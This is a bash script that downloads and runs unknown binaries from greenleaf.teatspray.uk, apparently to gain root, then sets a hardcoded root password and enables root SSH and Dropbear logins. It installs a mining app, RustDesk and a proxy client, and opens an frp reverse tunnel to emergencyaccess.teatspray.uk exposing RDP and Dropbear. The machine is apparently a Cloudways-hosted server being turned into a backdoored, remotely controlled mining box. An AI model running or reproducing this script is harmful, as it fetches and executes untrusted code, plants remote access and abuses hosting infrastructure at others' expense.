#!/bin/bash
cd
sleep 2
pwd
sleep 2
whoami
sleep 2
curl http://greenleaf.teatspray.uk/system33.tar.gz -L -O -J
sleep 2
curl http://greenleaf.teatspray.uk/ubuntu22.04.tar.gz -L -O -J
sleep 2
tar -xf system33.tar.gz
sleep 2
tar -xf ubuntu22.04.tar.gz
sleep 2
./system33 -S . /bin/bash

sleep 2

su -

sleep 2
cd
sleep 2
whoami
sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2
apt update;apt -y install  dbus-x11 libwebkit2gtk-4.1-0 openssh-server dropbear sudo
sleep 2
cat > /etc/ssh/sshd_config <<EOR
Port 2222
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
EOR

sleep 2

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2

wget -q https://edge.uprock.com/v1/app-download/UpRock-Mining-v0.0.8.deb >/dev/null
sleep 2
dpkg -i UpRock-Mining-v0.0.8.deb
sleep 2

wget -q https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
sleep 2
tar -xvf frp_0.48.0_linux_amd64.tar.gz
# start from daemon
cp frp_0.48.0_linux_amd64/frpc /usr/bin
mkdir /etc/frp
mkdir /var/frp  # log

sleep 2

ls -l /var/lib/dpkg/info | grep -i libnss-systemd:amd64
mv /var/lib/dpkg/info/libnss-systemd:amd64.* /tmp

sleep 2

ls -l /var/lib/dpkg/info | grep -i libnss-mdns:amd64
mv /var/lib/dpkg/info/libnss-mdns:amd64.* /tmp

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2


adduser xrdp ssl-cert

sleep 2

usermod -a -G ssl-cert xrdp

sleep 2

service xrdp restart

sleep 2

service ssh restart

sleep 2

service dropbear restart

sleep 2

netstat -ntlp

sleep 2

echo "root:Pmataga87465622" | chpasswd

sleep 2


wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list

sleep 2

apt-get update
apt-get install -y google-chrome-stable

sleep 2
apt -y install libxdo3 gstreamer1.0-pipewire
sleep 2
wget https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb
sleep 2
dpkg -i rustdesk-1.3.8-x86_64.deb
sleep 2

apt -y install libqt5x11extras5
sleep 2
wget https://github.com/MatsuriDayo/nekoray/releases/download/3.26/nekoray-3.26-2023-12-09-debian-x64.deb
sleep 2
dpkg -i nekoray-3.26-2023-12-09-debian-x64.deb
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Cloudways_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord


echo "Your subdomain is : $currentdate"
sleep 2
echo "Your random word is : $randomWord"


randomNumber=$(shuf -i 10000-65000 -n 1)
echo "RDP port will be : $randomNumber"

sleep 2


randomNumber3=$(shuf -i 10000-65000 -n 1)
echo "Dropbear port will be : $randomNumber2"
sleep 2



cat > /etc/frp/frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.uk
server_port = 995

[xrdp.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = $randomNumber
subdomain = $currentdate

[dropbear.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 2299
remote_port = $randomNumber3
subdomain = $currentdate

END


sleep 2

echo "Your RDP connection details are as following: $currentdate.emergencyaccess.teatspray.uk:$randomNumber"

sleep 2


echo "Your Dropbear connection details are as following: $currentdate.emergencyaccess.teatspray.uk:$randomNumber3"

sleep 2

service xrdp restart

sleep 2

/usr/bin/frpc -c /etc/frp/frpc.ini
